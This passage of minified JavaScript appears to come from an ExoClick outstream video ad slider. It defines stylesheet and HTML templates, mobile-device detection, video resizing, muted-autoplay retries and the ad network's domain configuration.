  }(ExoOutstreamSliderCommon.prototype), ExoSlider.prototype.constructor = ExoSlider, ExoSlider.prototype.constructorName = "ExoSlider", ExoSlider.prototype.main_el_id = null, ExoSlider.prototype.ctaEnabled = !1, ExoSlider.prototype.styleSheet = "        #{{main_el_id}}.exo_wrapper {            position: fixed;            right: -426px;            bottom: 0;            z-index: 9999;            -webkit-transition-duration: 1s;            -moz-transition-duration: 1s;            -o-transition-duration: 1s;            transition-duration: 1s;            max-width: 426px;            max-height: 240px;            cursor: pointer;            -webkit-tap-highlight-color: rgba(0,0,0,0);            display: table;        }        #{{main_el_id}}_video_container {             position: relative;            background: rgba(0, 0, 0, 0.7);        }        #{{main_el_id}} video {            pointer-events: none;            max-width: 100%;            max-height: 320px;            display: table;            margin: 0px auto;        }        #{{main_el_id}}.ucBrowser {            z-index:99999999;        }        #{{main_el_id}}.ucBrowser .exo_close{            padding:3px;            background:none;            top:-20px;        }        #{{main_el_id}}.ucBrowser .exo_link{            width:100%;        }        #{{main_el_id}} .exo_link {            color: rgb(255, 255, 255);            font-size: 12px;            font-family: Roboto, sans-serif, Verdana, Arial;            padding: 0px 5px;            background: rgba(0, 0, 0, 0.7);            text-decoration: none;            position: relative;            display: inline-block;            line-height: 20px;        }        #{{main_el_id}} .exo_close {            pointer-events: auto;            position: absolute;            padding: 10px 15px;            user-select: none;            color: rgb(255, 255, 255);            right: 0px;            top: 0px;            background: rgba(0, 0, 0, 0.7);            cursor: pointer;            z-index: 9999;        }        #{{main_el_id}} .exo_close:hover {                opacity: 1;            }        #{{main_el_id}} .exo_close_text{            position: relative;            float: left;            color: #FFFFFF;            font-family: Arial, Helvetica, sans-serif;            font-size: 13px;            height: 15px;            line-height: normal;            font-weight: normal;            text-decoration: underline;            background: transparent !important;        }        #{{main_el_id}}_display_url_box {            width: 100%;            font-size: 2vh;        }        #{{main_el_id}}_exo_cta_text_box {            background: rgba(236, 188, 27, 1) !important;            border-radius: 3px;            padding: 6px 10px;            justify-content: center;            flex-shrink: 0;        }        #{{main_el_id}}_exo_cta_text_box:hover {            background: rgb(255, 205, 55) !important;        }        #{{main_el_id}}_exo_display_url_box {            margin-right: 5px;            overflow: hidden;        }        #{{main_el_id}}_exo_cta_text_box, #{{main_el_id}}_exo_display_url_box {            display: flex;            align-items: center;            flex-direction: row;        }        #{{main_el_id}}_cta_text, #{{main_el_id}}_display_url {            font-size: 9px;            font-family: Roboto, sans-serif, Verdana, Arial;            text-decoration: none;        }        #{{main_el_id}}_cta_text {            font-size: 9px;            text-transform: uppercase;            color: rgba(34, 33, 31, 1);            margin-right: 2px;            flex-shrink: 0;        }        #{{main_el_id}}_cta_text_link_icon {            flex: none;        }        #{{main_el_id}}_display_url {            color: rgba(236, 188, 27, 1);            display: flex;            align-items: center;            letter-spacing: 0.01em;            margin: 3px;            overflow: hidden;            white-space: nowrap;            text-overflow: ellipsis;            display: inline-block;        }        #{{main_el_id}}_exo_display_url_box:hover #{{main_el_id}}_display_url {            color: rgb(255, 205, 55) !important;        }        #{{main_el_id}}_display_url_ad_icon {            background: rgba(236, 188, 27, 1);            color: rgba(34, 33, 31, 1);            display: flex;            align-items: center;            display: flex;            flex-direction: column;            align-items: flex-start;            padding: 2px;            border-radius: 1px;        }        #{{main_el_id}}_exo_display_url_box:hover #{{main_el_id}}_display_url_ad_icon {            background: rgb(255, 205, 55);        }        #{{main_el_id}}_display_url_link_icon {            flex: none;        }        #{{main_el_id}}_exo_display_url_box:hover #{{main_el_id}}_display_url_link_icon path {            fill: rgb(255, 205, 55);        }        #{{main_el_id}}_cta_wrapper {            background: rgba(34, 33, 31, 1);            padding: 10px;            cursor: pointer;            display: flex !important;            justify-content: space-between;            flex-direction: row;            width: inherit;        }        #{{main_el_id}}:hover > #{{main_el_id}}_cta_wrapper {            background: rgb(44, 44, 44);        }        #{{main_el_id}} .exo_close svg {            height: 15px;            width: 15px;            fill: #FFFFFF;            float: right;            display: none;        }        #{{main_el_id}} .progress_exo_wrapper {            position: absolute;            width: calc(100% - 30px);            height: 3px;            left: 15px;            bottom: 15px;            background: rgba(255, 255, 255, 0.25);        }        #{{main_el_id}} .progress_exo_wrapper:hover  {            background: rgba(255, 255, 255, 0.35);        }        #{{main_el_id}} .exo_progressbar {            width: 0%;            height: 100%;            background: rgba(249, 211, 0, 0.8);            transition: width 0.6s linear 0s;        }        #{{main_el_id}} .progress_exo_wrapper:hover .exo_progressbar {            background: rgb(255, 205, 55);        }        #{{main_el_id}}_replay_button {            top:50%;            left:50%;            transform: translate(-50%, -50%);            height: 70px;            width: 70px;            position: absolute;            border-radius: 50%;            background: rgba(0, 0, 0, 0.7);            display: none;        }        #{{main_el_id}}_mute_button {            border-radius: 5px;            position: absolute;            left: 15px;            bottom: 28px;            background: rgba(0, 0, 0, 0.7);            height: 30px;            width: 30px;            opacity: 0.85;        }        #{{main_el_id}}_mute_button:hover {                opacity: 1;            }        #{{main_el_id}}_mute_button svg {            position: absolute;            top:50%;            left:50%;            transform: translate(-50%, -50%);            fill: #FFFFFF;            height: 24px;            width: 24px;            display: none;        }        #{{main_el_id}}.exo_notransition, #{{main_el_id}} .exo_notransition {            -webkit-transition: none !important;            -moz-transition: none !important;            -o-transition: none !important;            transition: none !important;        }        video::-webkit-media-controls-start-playback-button {            display: none !important;        }        @media only screen and (max-device-width: 480px) {            #{{main_el_id}}.exo_wrapper {                max-width: calc((16 * {{screen_density}}vh) / 9);                width: 100%;                height: auto !important;            }            #{{main_el_id}}.exo_wrapper video {                max-height: calc({{screen_density}}vh);            }            #{{main_el_id}} .exo_link {                display:none;            }            #{{main_el_id}} .exo_close{                height: 3vh;                padding: 0.5vh 1vh;            }            #{{main_el_id}}.ucBrowser .exo_close{                top:-3vh;            }            #{{main_el_id}} .exo_close_text{                font-size: 2vh;                height: 3vh;            }            #{{main_el_id}} .exo_close svg {                height: 3vh;                width: 3vw;            }            #{{main_el_id}} .progress_exo_wrapper{                width: calc(100% - 6vw);                height: 0.5vh;                left: 3vw;                bottom: 2vh;            }            #{{main_el_id}}_mute_button {                border-radius: 1vw;                position: absolute;                right: 2vw;                bottom: 6vw;                height: 6.5vw;                 width: 6.5vw;                left: 5px;                margin: 5px;            }            #{{main_el_id}}_mute_button svg {                height: 6vw;                width: 6vw;            }            #{{main_el_id}}_replay_button {                height: 13vw;                width: 13vw;            }            #{{main_el_id}}_cta_wrapper {                padding: 3px;                position: relative;            }            #{{main_el_id}}_exo_display_url_box {                display: none;            }            #{{main_el_id}}_exo_cta_text_box {                width: 100%;                z-index: 9999;            }            #{{main_el_id}}_cta_text {                font-size: 3vw;            }        }        @media only screen and (max-device-height: 480px) and (orientation:landscape), only screen and (max-device-width: 480px) and (orientation:landscape){            #{{main_el_id}}.exo_wrapper {                max-width: calc({{screen_density}}vw);                height: auto !important;            }            #{{main_el_id}}.exo_wrapper video {                max-height: calc(50vh - ({{screen_density}}vh - 10vh) * -1);            }            #{{main_el_id}} .exo_link {                display:none;            }            #{{main_el_id}} .exo_close{                height: 3vw;                padding: 0.5vw 1vw;            }            #{{main_el_id}}.ucBrowser .exo_close{                top: -3vw;            }            #{{main_el_id}} .exo_close_text{                font-size: 1.5vw;                height: 3vw;            }            #{{main_el_id}} .exo_close svg {                height: 3vw;                width: 3vh;            }            #{{main_el_id}} .progress_exo_wrapper{                width: calc(100% - 6vh);                height: 0.5vw;                left: 3vh;                bottom: 2vw;            }            #{{main_el_id}}_mute_button {                border-radius: 1vh;                position: absolute;                right: 2vh;                bottom: 6vh;                height: 6.5vh; width: 6.5vh;            }            #{{main_el_id}}_mute_button svg {                height: 6vh;                width: 6vh;            }            #{{main_el_id}}_replay_button {                height: 13vh;                width: 13vh;            }            #{{main_el_id}}_cta_wrapper {                padding: 3px 2px;            }            #{{main_el_id}}_exo_cta_text_box {                width: 100%;            }            #{{main_el_id}}_exo_display_url_box {                display: none;            }        }        ", ExoSlider.prototype.tplMain = '        <div id="{{main_el_id}}" class="exo_wrapper">            {{branding}}            <div id="{{main_el_id}}_video_container" playsinline="" webkit-playsinline="">                <video id="{{main_el_id}}_video" muted playsinline="" webkit-playsinline="">                    <source id="{{main_el_id}}_source" src="">                </video>                <div id="{{main_el_id}}_close" class="exo_close">                    <div id="{{main_el_id}}_close_text" class="exo_close_text"></div>                    <svg id="{{main_el_id}}_close_x" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">                        <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/>                        <path d="M0 0h24v24H0z" fill="none"/>                    </svg>                </div>                <div id="{{main_el_id}}_replay_button">                    <svg style="fill: #FFFFFF;" viewBox="4 4.5 27 27" xmlns="http://www.w3.org/2000/svg">                        <path d="M 18,11 V 7 l -5,5 5,5 v -4 c 3.3,0 6,2.7 6,6 0,3.3 -2.7,6 -6,6 -3.3,0 -6,-2.7 -6,-6 h -2 c 0,4.4 3.6,8 8,8 4.4,0 8,-3.6 8,-8 0,-4.4 -3.6,-8 -8,-8 z"/>                    </svg>                </div>                <div id="{{main_el_id}}_mute_button">                    <svg id="{{main_el_id}}_mute_off" viewBox="0 0 15 19" xmlns="http://www.w3.org/2000/svg">                        <path d="m0 5.5924v5.8152h3.7778l4.7222 4.8461v-15.507l-4.7222 4.8461h-3.7778zm12.75 2.9076c0-1.7155-0.9633-3.1887-2.3611-3.9059v7.8021c1.3978-0.7075 2.3611-2.1807 2.3611-3.8962zm-2.3611-8.5v1.9966c2.7294 0.83352 4.7222 3.431 4.7222 6.5034 0 3.0724-1.9928 5.6699-4.7222 6.5034v1.9966c3.7872-0.882 6.6111-4.3518 6.6111-8.5 0-4.1482-2.8239-7.618-6.6111-8.5z"/>                    </svg>                    <svg id="{{main_el_id}}_mute_on" viewBox="0 0 15 19" xmlns="http://www.w3.org/2000/svg">                        <path d="m12.75 8.5c0-1.6717-0.9633-3.1072-2.3611-3.8061v2.0872l2.3139 2.3139c0.0283-0.18889 0.0472-0.38722 0.0472-0.595zm2.3611 0c0 0.88778-0.1889 1.7189-0.51 2.4933l1.4261 1.4261c0.6234-1.1711 0.9728-2.5027 0.9728-3.9194 0-4.0422-2.8239-7.4233-6.6111-8.2828v1.9456c2.7294 0.81222 4.7222 3.3433 4.7222 6.3372zm-13.912-8.5l-1.1994 1.1994 4.4672 4.4672h-4.4672v5.6666h3.7778l4.7222 4.7223v-6.3562l4.0139 4.0139c-0.6328 0.4911-1.3411 0.8784-2.125 1.1145v1.9455c1.3033-0.2927 2.4839-0.8972 3.485-1.7094l1.9267 1.9361 1.1994-1.1994-8.5-8.5-7.3006-7.3006zm7.3006 0.94444l-1.9739 1.9739 1.9739 1.9739v-3.9478z"/>                    </svg>                </div>                <div class="progress_exo_wrapper">                    <div id="{{main_el_id}}_progress" class="exo_progressbar">                    </div>                </div>            </div>            <div id="{{main_el_id}}_cta_wrapper">                {{displayUrl}}                {{ctaText}}            </div>        </div>        ', ExoSlider.prototype.tplBrand = '<a id="{{main_el_id}}_network_link" target="_blank" href="" class="exo_link"></a>', ExoSlider.prototype.tplDisplayUrl = '        <div id="{{main_el_id}}_exo_display_url_box">            <svg id="{{main_el_id}}_display_url_ad_icon" width="10" height="8" viewBox="0 0 15 10" fill="none" xmlns="http://www.w3.org/2000/svg">                <path d="M4.18945 1.60547L1.64062 9H0.0996094L3.31055 0.46875H4.29492L4.18945 1.60547ZM6.32227 9L3.76758 1.60547L3.65625 0.46875H4.64648L7.86914 9H6.32227ZM6.19922 5.83594V7.00195H1.55859V5.83594H6.19922ZM12.6708 7.6875V0H14.0887V9H12.8055L12.6708 7.6875ZM8.54578 5.90039V5.77734C8.54578 5.29688 8.60242 4.85938 8.7157 4.46484C8.82898 4.06641 8.99305 3.72461 9.20789 3.43945C9.42273 3.15039 9.68445 2.92969 9.99305 2.77734C10.3016 2.62109 10.6493 2.54297 11.036 2.54297C11.4188 2.54297 11.7548 2.61719 12.0438 2.76562C12.3329 2.91406 12.579 3.12695 12.7821 3.4043C12.9852 3.67773 13.1473 4.00586 13.2684 4.38867C13.3895 4.76758 13.4755 5.18945 13.5262 5.6543V6.04688C13.4755 6.5 13.3895 6.91406 13.2684 7.28906C13.1473 7.66406 12.9852 7.98828 12.7821 8.26172C12.579 8.53516 12.3309 8.74609 12.038 8.89453C11.7489 9.04297 11.411 9.11719 11.0243 9.11719C10.6415 9.11719 10.2958 9.03711 9.98719 8.87695C9.6825 8.7168 9.42273 8.49219 9.20789 8.20312C8.99305 7.91406 8.82898 7.57422 8.7157 7.18359C8.60242 6.78906 8.54578 6.36133 8.54578 5.90039ZM9.95789 5.77734V5.90039C9.95789 6.18945 9.98328 6.45898 10.0341 6.70898C10.0887 6.95898 10.1727 7.17969 10.286 7.37109C10.3993 7.55859 10.5458 7.70703 10.7255 7.81641C10.9091 7.92188 11.1278 7.97461 11.3817 7.97461C11.702 7.97461 11.9657 7.9043 12.1727 7.76367C12.3798 7.62305 12.5419 7.43359 12.6591 7.19531C12.7802 6.95312 12.8622 6.68359 12.9052 6.38672V5.32617C12.8817 5.0957 12.8329 4.88086 12.7587 4.68164C12.6884 4.48242 12.5927 4.30859 12.4716 4.16016C12.3505 4.00781 12.2001 3.89062 12.0204 3.80859C11.8446 3.72266 11.6356 3.67969 11.3934 3.67969C11.1356 3.67969 10.9169 3.73438 10.7372 3.84375C10.5575 3.95312 10.4091 4.10352 10.2919 4.29492C10.1786 4.48633 10.0946 4.70898 10.0399 4.96289C9.98523 5.2168 9.95789 5.48828 9.95789 5.77734Z" fill="#22211F"/>            </svg>            <span id="{{main_el_id}}_display_url"></span>            <svg id="{{main_el_id}}_display_url_link_icon" width="12" height="12" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">                <g clip-path="url(#clip0_305_11)">                    <path d="M15.8333 15.8333H4.16667V4.16667H10V2.5H4.16667C3.24167 2.5 2.5 3.25 2.5 4.16667V15.8333C2.5 16.75 3.24167 17.5 4.16667 17.5H15.8333C16.75 17.5 17.5 16.75 17.5 15.8333V10H15.8333V15.8333ZM11.6667 2.5V4.16667H14.6583L6.46667 12.3583L7.64167 13.5333L15.8333 5.34167V8.33333H17.5V2.5H11.6667Z" fill="#ECBC1B"/>                </g>                <defs>                    <clipPath id="clip0_305_11">                        <rect width="20" height="20" fill="white"/>                    </clipPath>                </defs>            </svg>        </div>    ', ExoSlider.prototype.tplCtaText = '        <div id="{{main_el_id}}_exo_cta_text_box">            <span id="{{main_el_id}}_cta_text"></span>            <svg id="{{main_el_id}}_cta_text_link_icon" width="11" height="11" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">                <g clip-path="url(#clip0_305_11)">                    <path d="M15.8333 15.8333H4.16667V4.16667H10V2.5H4.16667C3.24167 2.5 2.5 3.25 2.5 4.16667V15.8333C2.5 16.75 3.24167 17.5 4.16667 17.5H15.8333C16.75 17.5 17.5 16.75 17.5 15.8333V10H15.8333V15.8333ZM11.6667 2.5V4.16667H14.6583L6.46667 12.3583L7.64167 13.5333L15.8333 5.34167V8.33333H17.5V2.5H11.6667Z" fill="#22211F"/>                </g>                <defs>                    <clipPath id="clip0_305_11">                        <rect width="20" height="20" fill="white"/>                    </clipPath>                </defs>            </svg>        </div>    ', ExoSlider.prototype.scriptElement = document.body, ExoSlider.prototype.videoStyle = function (i, e) {
    this.scriptElement.appendChild(i), this.scriptElement.appendChild(e);
  }, ExoSlider.prototype.containerHasRoom = function () {
    return !0;
  }, ExoSlider.prototype.calculateWrapperByDensityToMobile = function (i, e, t) {
    if (!this.isMobileDevice()) return;
    if (this.isMobileDeviceLandscape()) return void this.resizeHorizontalVideoStyle(i);
    const o = document.getElementById(this.main_el_id + "_cta_wrapper");
    this.resizeWrapperForVerticalVideo(i, e, o, t), this.resizeWrapperWidth(i, t, o, e);
  }, ExoSlider.prototype.resizeHorizontalVideoStyle = function (i) {
    if (i.offsetHeight < 100) {
      let i = document.getElementById(this.main_el_id + "_mute_button");
      i.style.height = "4.5vh", i.style.width = "4.5vh";
      let e = document.getElementById(this.main_el_id + "_replay_button");
      e.style.height = "30px", e.style.width = "30px", document.getElementsByClassName("progress_exo_wrapper")[0].style.bottom = "1vh";
    }
  }, ExoSlider.prototype.resizeWrapperWidth = function (i, e, t, o) {
    const n = null !== t ? t.offsetHeight : 0,
      a = i.offsetWidth / i.offsetHeight;
    let l = (window.outerHeight - n) * (o / 100) * a;
    l > e.offsetWidth && (l = e.offsetWidth), i.style.maxWidth = l + "px";
  }, ExoSlider.prototype.resizeWrapperForVerticalVideo = function (i, e, t, o) {
    const n = null !== t ? t.offsetHeight : 0;
    if (o.videoHeight <= o.videoWidth || 0 === n) return;
    const a = document.getElementById(this.main_el_id + "_cta_text"),
      l = window.outerHeight * (e / 100);
    o.style.height = l - n + "px", a.style.fontSize = "1.7vw", i.style.height = l + "px";
  }, ExoSlider.prototype.displayCta = function (i, e) {
    var t = document.getElementById(this.main_el_id + "_cta_wrapper"),
      o = document.getElementById(this.main_el_id + "_display_url");
    if (this.ctaEnabled && t && "" !== i && (t.style.display = "block"), this.ctaEnabled && !o && (t.style.justifyContent = "flex-end"), !1 === this.ctaEnabled && (t.style.padding = "0px"), this.ctaEnabled && !this.isMobileDevice()) {
      var n = document.getElementById(this.main_el_id),
        a = e.videoWidth / e.videoHeight,
        l = t.offsetHeight,
        d = null;
      if (e.videoHeight < 100) return;
      if (e.videoWidth > e.videoHeight) d = n.offsetWidth - l * a;else {
        var r = document.getElementById(this.main_el_id + "_network_link"),
          _ = 0;
        null !== r && (_ = r.offsetHeight), d = (240 - (l / 2 - _)) * a;
      }
      l * a < d * a && (n.style.width = d + "px");
    }
  }, ExoSlider.prototype.isMobileDevice = function () {
    var i,
      e = !1;
    return i = navigator.userAgent || navigator.vendor || window.opera, (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(i) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw-(n|u)|c55\/|capi|ccwa|cdm-|cell|chtm|cldc|cmd-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc-s|devi|dica|dmob|do(c|p)o|ds(12|-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(-|_)|g1 u|g560|gene|gf-5|g-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd-(m|p|t)|hei-|hi(pt|ta)|hp( i|ip)|hs-c|ht(c(-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i-(20|go|ma)|i230|iac( |-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|-[a-w])|libw|lynx|m1-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|-([1-8]|c))|phil|pire|pl(ay|uc)|pn-2|po(ck|rt|se)|prox|psio|pt-g|qa-a|qc(07|12|21|32|60|-[2-7]|i-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h-|oo|p-)|sdk\/|se(c(-|0|1)|47|mc|nd|ri)|sgh-|shar|sie(-|m)|sk-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h-|v-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl-|tdg-|tel(i|m)|tim-|t-mo|to(pl|sh)|ts(70|m-|m3|m5)|tx-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas-|your|zeto|zte-/i.test(i.substr(0, 4))) && (e = !0), e;
  }, ExoSlider.prototype.isMobileDeviceLandscape = function () {
    return window.innerWidth > window.innerHeight && this.isMobileDevice();
  }, ExoSlider.prototype.init = function (i) {
    var e = [];
    for (var t in i) t.search("ex_") >= 0 && (e[t] = i[t]);
    this.displayAd(i.idzone, parseInt(i.close_after), parseInt(i.frequency_period), i.on_complete, parseInt(i.branding_enabled), parseInt(i.sub), parseInt(i.sub2), parseInt(i.sub3), parseInt(i.cat), parseInt(i.screen_density), i.tags, null, i.cookieconsent, parseInt(i.cta_enabled), e);
  }, ExoSlider.prototype.bindClick = function (i) {
    return !0;
  }, ExoSlider.prototype.playPromise = function (i, e, t) {
    var o = document.getElementById(i + "_mute_on"),
      n = document.getElementById(i + "_mute_off");
    enableInlineVideo(e, {
      iPad: !0
    });
    var a = e.play();
    void 0 === a || void 0 === a.then ? e.addEventListener("loadedmetadata", t) : a.then(t).catch(function (i) {
      let a = setInterval(() => {
        e.muted = !0, o.style.display = "block", n.style.display = "none", e.play().then(t).then(() => {
          clearInterval(a);
        });
      }, 1e3);
    });
  }, ExoSlider.prototype.resizeWrapper = function (i, e) {
    i.classList.add("exo_notransition");
    var t = e.videoWidth / e.videoHeight,
      o = 16 / 9;
    if (e.videoWidth < e.videoHeight && (o = 9 / 16), Math.abs(t - o) > .2 * o) {
      i.style.removeProperty("height"), i.style.removeProperty("width");
      var n = i.offsetHeight * t,
        a = window.innerWidth > window.innerHeight ? window.innerHeight : window.innerWidth;
      if (n > a && e.videoWidth > e.videoHeight) {
        var l = (n = a) / t;
        i.style.height = l + "px";
      }
    }
  }, ExoSlider.prototype.closeDivAnnimation = function (i) {
    i.style.right = "-" + i.offsetWidth + "px";
  }, window.ExoVideoSlider = new ExoSlider(), window.VideoSlider = window.ExoVideoSlider;
})({
  "syndicationDomain": "syndication.realsrv.com",
  "network": "ExoClick",
  "networkDomain": "exoclick.com",
  "adsSubdomain": "a.realsrv.com",
  "brandingName": "Ads by exoclick.com",
  "showBranding": false
});